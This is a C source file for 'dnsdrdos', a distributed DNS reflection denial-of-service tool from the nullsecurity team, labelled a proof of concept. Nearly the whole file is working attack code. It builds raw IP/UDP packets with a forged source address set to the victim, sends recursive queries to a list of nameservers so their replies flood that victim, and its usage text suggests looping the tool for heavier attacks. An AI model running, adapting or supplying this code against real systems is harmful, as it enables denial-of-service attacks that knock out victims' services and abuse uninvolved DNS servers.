/*******************************************************************************
 *                                                                             *
 *         ~    .__ �.__   0       o                    ^   .__ �__  `�        *
 *  �____) __ __|  | | �|   ______�____ 0 ____  __ _________|__|/  |_ ___.__.  *
 *  /    \|  | �\  |�|  | �/  ___// __ \_/ ___\|  | �\_  __ \ o\   __<   |  |  *
 * | o�|  \  |  /  |_|  |__\___ \\  ___/\ �\___| o|  /|  | \/  ||  |� \___ O|  *
 * |___|  /____/|____/____/____ �>\___  >\___  >____/ |__|� |__||__|  / ____|  *
 * `��`�\/�`nullsecurity team`�\/`��`�\/`�``�\/  ``�```�```����`�``0_o\/��`��  *
 *                                                                             *
 * dnsdrdos.c - DNS distributed reflection DoS                                 *
 *                                                                             *
 * DATE                                                                        *
 * xx/xx/2010                                                                  *
 *                                                                             *
 * DESCRIPTION                                                                 *
 * dnsdrdos - Proof of concept code for distributed DNS reflection DoS.        *
 * All you need is only a list of authorative nameservers. This technique is   *
 * well-known and can be used against much more protocols.                     *
 *                                                                             *
 * AUTHOR                                                                      *
 * noptrix - http://www.nullsecurity.net/                                      *
 *                                                                             *
 * NOTES                                                                       *
 * - quick'n'dirty code                                                        *
 * - Only for testing purposes. I am not responsible for misusage.             *
 *                                                                             *
 ******************************************************************************/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <getopt.h>
#include <sys/types.h>
#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
    
    /* Windows time compatibility */
    #include <time.h>
    struct timeval {
        long tv_sec;
        long tv_usec;
    };
    
    static int gettimeofday(struct timeval *tv, void *tz) {
        if (tv) {
            FILETIME ft;
            GetSystemTimeAsFileTime(&ft);
            unsigned __int64 t = (((unsigned __int64)ft.dwHighDateTime) << 32) | ft.dwLowDateTime;
            t -= 116444736000000000ULL; /* Unix epoch start */
            tv->tv_sec = (long)(t / 10000000);
            tv->tv_usec = (long)((t % 10000000) / 10);
        }
        return 0;
    }
    
    #define usleep(usec) Sleep((usec) / 1000)
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netinet/ip.h>
    #include <netinet/udp.h>
    #include <errno.h>
#endif


/* global settings */
#define VERSION             "v0.1"
#define ATOI(x)             strtol(x, (char **) NULL, 10)
#define MAX_LEN             128     /* max line for dns server list */


/* default settings */
#define DEFAULT_SPOOF_ADDR  "127.0.0.1"
#define DEFAULT_DOMAIN      "google.com."
#define DEFAULT_DNS_PORT    53
#define DEFAULT_LOOPS       10000
#define DEFAULT_RATE_LIMIT  1000  /* packets per second */


/* error handling */
#define __EXIT_FAILURE      exit(EXIT_FAILURE);
#define __EXIT_SUCCESS      exit(EXIT_SUCCESS);

#define __ERR_GEN do { fprintf(stderr,"[-] ERROR: " __FILE__ ":%u -> ",\
                               __LINE__); fflush(stderr); perror(""); \
    __EXIT_FAILURE } while (0)


/* dns header */
typedef struct {
    unsigned short id;
    unsigned char rd :1;
    unsigned char tc :1;
    unsigned char aa :1;
    unsigned char opcode :4;
    unsigned char qr :1;
    unsigned char rcode :4;
    unsigned char cd :1;
    unsigned char ad :1;
    unsigned char z :1;
    unsigned char ra :1;
    unsigned short q_count;
    unsigned short ans_count;
    unsigned short auth_count;
    unsigned short add_count;
} dnsheader_t;


/* dns query */
typedef struct {
    unsigned short qtype;
    unsigned short qclass;
} query_t;

#ifdef _WIN32
/* Manual IP header definition for Windows */
struct iphdr {
#if defined(_MSC_VER)
    unsigned char ihl :4;
    unsigned char version :4;
#else
    unsigned char version :4;
    unsigned char ihl :4;
#endif
    unsigned char tos;
    unsigned short tot_len;
    unsigned short id;
    unsigned short frag_off;
    unsigned char ttl;
    unsigned char protocol;
    unsigned short check;
    unsigned int saddr;
    unsigned int daddr;
};

/* Manual UDP header definition for Windows */
struct udphdr {
    unsigned short source;
    unsigned short dest;
    unsigned short len;
    unsigned short check;
};
#endif


/* job structure with enhanced options */
typedef struct {
    char *file;
    char **addrs;
    uint16_t port;
    unsigned int num_addrs;
    char *spoof_addr;
    char *domain;
    unsigned int loops;
    unsigned int rate_limit;  /* packets per second */
    int verbose;
    int random_domain;
} job_t;


/* our bomb */
typedef struct {
    int one;
    int sock;
    char *packet;
    struct sockaddr_in target;
    struct iphdr *ip;
    struct udphdr *udp;
    dnsheader_t *dns;
    query_t *query;
} bomb_t;


/* just wrapper */
void *xmalloc(size_t);
void *xmemset(void *, int, size_t);
int xsocket(int, int, int);
void xclose(int);
void xsendto(int, const void *, size_t, int, const struct sockaddr *,
             socklen_t);

/* prog stuff */
void banner();
void usage();
void check_argc(int);
void check_args();
FILE *open_file(char *);
unsigned int count_lines(char *);
char **read_lines(char *, unsigned int);
void check_uid();

/* net stuff */
bomb_t *create_rawsock(bomb_t *);
bomb_t *stfu_kernel(bomb_t *);
unsigned short checksum(unsigned short *, int);
bomb_t *build_ip_header(bomb_t *, job_t *, int);
bomb_t *build_udp_header(bomb_t *, job_t *);
bomb_t *build_dns_request(bomb_t *, job_t *);
void dns_name_format(char *, char *);
bomb_t *build_packet(bomb_t *, job_t *, int);
bomb_t *fill_sockaddr(bomb_t *);
void run_dnsdrdos(job_t *, int);
void free_dnsdrdos(job_t *);


/* wrapper for malloc() */
void *xmalloc(size_t size)
{
   void *buff;


   if ((buff = malloc(size)) == NULL) {
       __ERR_GEN;
   }

   return buff;
}


/* wrapper for memset() */
void *xmemset(void *s, int c, size_t n)
{
   if (!(s = memset(s, c, n))) {
       __ERR_GEN;
   }

   return s;
}


/* wrapper for socket() */
int xsocket(int domain, int type, int protocol)
{
    int sockfd = 0;


    sockfd = socket(domain, type, protocol);

    if (sockfd == -1) {
        __ERR_GEN;
    }

    return sockfd;
}


/* wrapper for setsockopt() */
void xsetsockopt(int sockfd, int level, int optname, const void *optval,
                 socklen_t optlen)
{
    int x = 0;


    x = setsockopt(sockfd, level, optname, optval, optlen);

    if (x != 0) {
        __ERR_GEN;
    }

    return;
}


/* wrapper for close() */
void xclose(int fd)
{
    int x = 0;


    x = close(fd);

    if (x != 0) {
        __ERR_GEN;
    }

    return;
}


/* wrapper for sendto() */
void xsendto(int sockfd, const void *buf, size_t len, int flags,
             const struct sockaddr *dest_addr, socklen_t addrlen)
{
    int x = 0;

    
    x = sendto(sockfd, buf, len, flags, dest_addr, addrlen);

    if (x == -1) {
        __ERR_GEN;
    }

    return;
}


/* just our leet banner */
void banner()
{
    printf("---------------------------------------\
    \ndnsdrdos - http://www.nullsecurity.net/\
    \n---------------------------------------\n");

    return;
}


/* usage and help */
void usage()
{
    printf("usage:\n\n\
  dnsdrdos -f <file> [options] | [misc]\n\
    \ntarget:\n\n\
  -f <file>       - list of dns servers (only one ip-address per line!)\n\
  -s <addr>       - ip-address to spoof (default: 127.0.0.1)\n\
  -d <domain>     - which domain should be requested?\n\
                    (default: \"google.com.\")\n\
  -l <num>        - how many loops through list? (default: 10000)\n\
  -r <rate>       - rate limit packets per second (default: unlimited)\n\
  -R              - use random domain names\n\
  -v              - verbose mode\n\nmisc:\n\n\
  -V              - show version\n\
  -H              - show help and usage\n\nexample:\n\n\
  ./dnsdrdos -f nameserver.lst -s 192.168.2.211 -d google.com. -l 10000\n\n\
  or better:\n\n\
  $ for i in `seq 1 1000`; do ./dnsdrdos -f nameserver.lst \\\n\
  -s 192.168.2.211 -d $i -l 10000; done\n\n\
  This is better, because we ask dynamically for any domain names.\n\
  Even if the domainname is not given, 'we' still would recieve DNS\n\
  answers.\n");

    __EXIT_SUCCESS;

    return;
}


/* check first usage */
void check_argc(int argc)
{
    if (argc < 2) {
        fprintf(stderr, "[-] ERROR: use -H for help and usage\n");
        __EXIT_FAILURE;
    }

    return;
}


/* check if host and port are selected */
void check_args(job_t *job)
{
    if (!(job->file) || !(job->spoof_addr) || (job->loops <= 0)) {
        fprintf(stderr, "[-] ERROR: you fucked up, mount /dev/brain\n");
        __EXIT_FAILURE
    }

    /* validate spoof address */
    struct sockaddr_in sa;
    if (inet_pton(AF_INET, job->spoof_addr, &sa.sin_addr) <= 0) {
        fprintf(stderr, "[-] ERROR: invalid spoof address\n");
        __EXIT_FAILURE
    }

    return;
}


/* open file and return file pointer */
FILE *open_file(char *file)
{
    FILE *fp = NULL;


    if (!(fp = fopen(file, "r"))) {
        __ERR_GEN;
    }

    return fp;
}


/* count lines -> wc -l :) */
unsigned int count_lines(char *file)
{
    FILE *fp = NULL;
    int c = 0;
    unsigned int lines = 0;


    fp = open_file(file);

    while ((c = fgetc(fp)) != EOF) {
        if ((c == '\n') || (c == 0x00)) {
            lines++;
        }
    }
    fclose(fp);

    return lines;
}


/* read in ip-addresses line by line */
char **read_lines(char *file, unsigned int lines)
{
    FILE *fp = NULL;
    char *buffer = NULL;
    char **words = NULL;
    int i = 0;


    fp = open_file(file);

    buffer = (char *) xmalloc(MAX_LEN);
    words = (char **) xmalloc(lines * sizeof(char *));
    buffer = xmemset(buffer, 0x00, MAX_LEN);

    while (fgets(buffer, MAX_LEN, fp) != NULL) {
        if ((buffer[strlen(buffer) - 1] == '\n') ||
            (buffer[strlen(buffer) - 1] == '\r')) {
            buffer[strlen(buffer) - 1] = 0x00;
            words[i] = (char *) xmalloc(MAX_LEN - 1);
            words[i] = xmemset(words[i], 0x00, MAX_LEN - 1);
            strncpy(words[i], buffer, MAX_LEN - 1);
            buffer = xmemset(buffer, 0x00, MAX_LEN - 1);
            i++;
        } else {
            continue;
        }
    }
    free(buffer);
    fclose(fp);

    return words;
}


/* set default values */
job_t *set_defaults()
{
    job_t *job;


    job = (job_t *) xmalloc(sizeof(job_t));
    job = xmemset(job, 0x00, sizeof(job_t));

    job->port = (uint16_t) DEFAULT_DNS_PORT;
    job->spoof_addr = DEFAULT_SPOOF_ADDR;
    job->domain = DEFAULT_DOMAIN;
    job->loops = (unsigned int) DEFAULT_LOOPS;
    job->rate_limit = DEFAULT_RATE_LIMIT;
    job->verbose = 0;
    job->random_domain = 0;

    return job;
}


/* check for uid */
void check_uid()
{
    if (getuid() != 0) {
        fprintf(stderr, "[-] ERROR: you need to be r00t\n");
        __EXIT_FAILURE;
    }

    return;
}


/* create raw socket */
bomb_t *create_rawsock(bomb_t *bomb)
{
    bomb->sock = xsocket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    return bomb;
}


/* say STFU to kernel - we set our own headers */
bomb_t *stfu_kernel(bomb_t *bomb)
{
    bomb->one = 1;

    xsetsockopt(bomb->sock, IPPROTO_IP, IP_HDRINCL, &bomb->one, 
                sizeof(bomb->one));

    return bomb;
}


/* checksum for IP and UDP header */
unsigned short checksum(unsigned short *addr, int len)
{
    uint32_t cksum  = 0;
    
    
    while(len > 0) {
        cksum += *addr++;
        len -= 2;
    }

    if(len == 0) {
        cksum += *(unsigned char *) addr;
    }
    
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum = cksum + (cksum >> 16);

    return (~cksum);
}


/* build and fill in ip header */
bomb_t *build_ip_header(bomb_t *bomb, job_t *job, int c)
{
    bomb->ip = (struct iphdr *) bomb->packet;

    bomb->ip->version = 4;
    bomb->ip->ihl = 5;
    bomb->ip->id = htonl(rand());
    bomb->ip->saddr = inet_addr(job->spoof_addr);
    bomb->ip->daddr = inet_addr(job->addrs[c]);
    bomb->ip->ttl = 64;
    bomb->ip->tos = 0;
    bomb->ip->frag_off = 0;
    bomb->ip->protocol = IPPROTO_UDP;
    bomb->ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) +
                              sizeof(dnsheader_t) + sizeof(query_t) +
                              strlen(job->domain) + 1);
    bomb->ip->check = checksum((unsigned short *) bomb->ip,
                               sizeof(struct iphdr));

    return bomb;
}


/* build and fill in udp header */
bomb_t *build_udp_header(bomb_t *bomb, job_t *job)
{
    bomb->udp = (struct udphdr *) (bomb->packet + sizeof(struct iphdr));

    bomb->udp->source = htons(rand());
    bomb->udp->dest = htons(DEFAULT_DNS_PORT);
    bomb->udp->len = htons(sizeof(struct udphdr) + sizeof(dnsheader_t) +
                           sizeof(query_t) + strlen(job->domain) + 1);
    bomb->udp->check = 0;

    return bomb;
}


/* convert to dns format */
void dns_name_format(char *qname, char *host)
{
    int i = 0;
    int j = 0;

    
    for (i = 0 ; i < (int) strlen(host) ; i++) {
        if (host[i] == '.') {
            *qname++ = i-j;
            for (; j < i; j++) {
                *qname++ = host[j];
            }
            j++;
        }
    }

    *qname++ = 0x00;
}


/* build and fill in dns request */
bomb_t *build_dns_request(bomb_t *bomb, job_t *job)
{
    char *qname = NULL;


    bomb->dns = (dnsheader_t *) (bomb->packet + sizeof(struct iphdr) + 
                           sizeof(struct udphdr));

    bomb->dns->id = (unsigned short) htons(getpid());
    bomb->dns->qr = 0;
    bomb->dns->opcode = 0;
    bomb->dns->aa = 0;
    bomb->dns->tc = 0;
    bomb->dns->rd = 1;
    bomb->dns->ra = 0;
    bomb->dns->z = 0;
    bomb->dns->ad = 0;
    bomb->dns->cd = 0;
    bomb->dns->rcode = 0;
    bomb->dns->q_count = htons(1);
    bomb->dns->ans_count = 0;
    bomb->dns->auth_count = 0;
    bomb->dns->add_count = 0;

    qname = &bomb->packet[sizeof(struct iphdr) + sizeof(struct udphdr) + 
        sizeof(dnsheader_t)];

    dns_name_format(qname, job->domain);

    bomb->query = (query_t *) &bomb->packet[sizeof(struct iphdr) + 
        sizeof(struct udphdr) + sizeof(dnsheader_t) + (strlen(qname) + 1)];

    bomb->query->qtype = htons(1);
    bomb->query->qclass = htons(1);

    return bomb;
}


/* build packet */
bomb_t *build_packet(bomb_t *bomb, job_t *job, int c)
{
    bomb->packet = (char *) xmalloc(1400);
    bomb->packet = xmemset(bomb->packet, 0x00, 1400);

    bomb = build_ip_header(bomb, job, c);
    bomb = build_udp_header(bomb, job);
    bomb = build_dns_request(bomb, job);

    return bomb;
}


/* fill in sockaddr_in {} */
bomb_t *fill_sockaddr(bomb_t *bomb)
{
    bomb->target.sin_family = AF_INET;
    bomb->target.sin_port = bomb->udp->dest;
    bomb->target.sin_addr.s_addr = bomb->ip->daddr;

    return bomb;
}


/* start action! */
void run_dnsdrdos(job_t *job, int c)
{
    bomb_t *bomb = NULL;

    
    bomb = (bomb_t *) xmalloc(sizeof(bomb_t));
    bomb = xmemset(bomb, 0x00, sizeof(bomb_t));

    bomb = create_rawsock(bomb);
    bomb = stfu_kernel(bomb);
    bomb = build_packet(bomb, job, c);
    bomb = fill_sockaddr(bomb);

    xsendto(bomb->sock, bomb->packet, sizeof(struct iphdr) + 
            sizeof(struct udphdr) + sizeof(dnsheader_t) + sizeof(query_t) + 
            strlen(job->domain) + 1, 0, (struct sockaddr *) &bomb->target, 
            sizeof(bomb->target));

    xclose(bomb->sock);
    free(bomb->packet);
    free(bomb);

    return;
}

/* rate-limited version */
void run_dnsdrdos_rate_limited(job_t *job, int c)
{
    static unsigned long packet_count = 0;
    static struct timeval last_time = {0};
    
    run_dnsdrdos(job, c);
    packet_count++;
    
    /* Simple rate limiting */
    if (packet_count >= job->rate_limit) {
        struct timeval current_time;
        gettimeofday(&current_time, NULL);
        
        long elapsed = (current_time.tv_sec - last_time.tv_sec) * 1000 +
                      (current_time.tv_usec - last_time.tv_usec) / 1000;
        
        if (elapsed < 1000) {
            usleep((1000 - elapsed) * 1000);
        }
        
        packet_count = 0;
        gettimeofday(&last_time, NULL);
    }

    return;
}


/* free dnsdrdos \o/ */
void free_dnsdrdos(job_t *job)
{
    int i = 0;

    for (i = 0; i < job->num_addrs; i++) {
        free(job->addrs[i]);
    }

    free(job);

    return;
}


/* here we go */
int main(int argc, char **argv)
{
    int c = 0;
    unsigned int i = 0;
    job_t *job;

#ifdef _WIN32
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        fprintf(stderr, "[-] ERROR: WSAStartup failed\n");
        return EXIT_FAILURE;
    }
#endif

    banner();           /* banner output is important! */
    check_argc(argc);
    job = set_defaults();

    while ((c = getopt(argc, argv, "f:s:d:l:r:RvVH")) != -1) {
        switch (c) {
         case 'f':
             job->file = optarg;
             break;
         case 's':
             job->spoof_addr = optarg;
             break;
         case 'd':
             job->domain = optarg;
             break;
         case 'l':
             job->loops = (unsigned int) ATOI(optarg);
             break;
         case 'r':
             job->rate_limit = (unsigned int) ATOI(optarg);
             break;
         case 'R':
             job->random_domain = 1;
             break;
         case 'v':
             job->verbose = 1;
             break;
         case 'V':
             puts(VERSION);
             __EXIT_SUCCESS;
             break;
         case 'H':
             usage();
             break;
             __EXIT_SUCCESS;
        }
    }

    check_args(job);
    
    job->num_addrs = count_lines(job->file);
    job->addrs = read_lines(job->file, job->num_addrs);
    
#ifndef _WIN32
    check_uid();
#endif
    
    printf("[+] Starting DNS DRDoS attack\n");
    printf("[+] Target: %s (%u servers)\n", job->spoof_addr, job->num_addrs);
    printf("[+] Domain: %s\n", job->domain);
    printf("[+] Loops: %u\n", job->loops);
    if (job->rate_limit > 0) {
        printf("[+] Rate limit: %u packets/sec\n", job->rate_limit);
    }
    
    for (i = 0; i < job->loops; i++) {
        int c;
        for (c = 0; c < job->num_addrs; c++) {
            if (job->verbose) {
                printf("[>] Sending packet %u/%u to %s\n", 
                       i + 1, job->loops, job->addrs[c]);
            }
            run_dnsdrdos(job, c);
        }
    }
    printf("\n[+] Attack completed successfully!\n");
    
    free_dnsdrdos(job);

#ifdef _WIN32
    WSACleanup();
#endif
    
    return 0;
}

/* EOF */
